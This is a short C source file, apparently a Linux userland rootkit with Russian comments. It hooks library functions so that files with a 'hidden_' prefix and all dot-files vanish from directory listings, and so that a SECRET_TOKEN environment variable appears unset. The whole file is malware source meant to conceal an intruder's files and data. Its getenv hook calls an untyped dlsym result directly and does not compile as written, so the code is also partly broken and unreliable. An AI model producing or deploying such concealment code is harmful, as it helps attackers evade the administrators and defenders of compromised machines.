// rootkit.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

// Имя файла, который нужно скрыть
#define HIDDEN_PREFIX "hidden_"
#define HIDDEN_PROC "secret_process"

// Указатель на оригинальные функции
static DIR* (*original_opendir)(const char *pathname) = NULL;
static struct dirent* (*original_readdir)(DIR *dirp) = NULL;

// Переопределяем opendir
DIR* opendir(const char *pathname) {
    if (!original_opendir) {
        original_opendir = dlsym(RTLD_NEXT, "opendir");
    }

    DIR* dir = original_opendir(pathname);
    return dir;
}

// Переопределяем readdir — здесь скрываем файлы
struct dirent* readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // Скрываем файлы, начинающиеся с HIDDEN_PREFIX
        if (strncmp(entry->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
            continue;
        }
        // Скрываем файлы, начинающиеся с точки (скрытые, но дополнительно)
        if (entry->d_name[0] == '.') {
            continue;
        }
        break;
    }
    return entry;
}

// Переопределяем getenv — скрываем переменную
char* getenv(const char *name) {
    if (strcmp(name, "SECRET_TOKEN") == 0) {
        return NULL; // "Скрываем" переменную окружения
    }
    return dlsym(RTLD_NEXT, "getenv")(name);
}